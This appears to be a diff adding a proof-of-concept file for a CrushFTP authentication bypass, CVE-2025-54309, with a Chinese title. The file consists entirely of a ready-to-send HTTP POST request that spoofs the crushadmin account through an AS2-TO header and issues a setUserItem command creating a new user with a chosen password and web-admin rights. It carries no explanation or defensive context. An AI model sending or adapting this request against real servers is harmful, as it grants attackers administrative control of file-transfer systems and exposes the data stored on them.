@@ -1,0 +1,13 @@
+# CrushFTP 身份验证绕过漏洞 (CVE-2025-54309)
+POST /WebInterface/function/ HTTP/1.1
+Host: www.xwd_test.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+AS2-TO: \crushadmin
+Content-Type: disposition-notification
+X-Requested-With: XMLHttpRequest
+Cookie: CrushAuth=1755628505894_6BIIu82Vk0lI9naqUFa0zdjXuOZgDeQ5; currentAuth=DeQ5
+Content-Length: 792
+
+command=setUserItem&data_action=new&serverGroup=MainUsers&username=WATCHTOWRUSER&user=<?xml version="1.0" encoding="UTF-8"?><user type="properties"><max_logins_ip>8</max_logins_ip><real_path_to_user>./users/MainUsers/crushadmin/</real_path_to_user><root_dir>/</root_dir><user_name>CENSORED</user_name><version>1.0</version><max_logins>0</max_logins><last_logins>03/28/2025 03:00:26 PM</last_logins><password>NEWPASSWORD</password><site>(CONNECT)(WEB_ADMIN)</site><ignore_max_logins>true</ignore_max_logins><max_idle_time>0</max_idle_time><username>CENSORED</username></user>&xmlItem=user&vfs_items=<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>&permissions=<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>&c2f=DeQ5
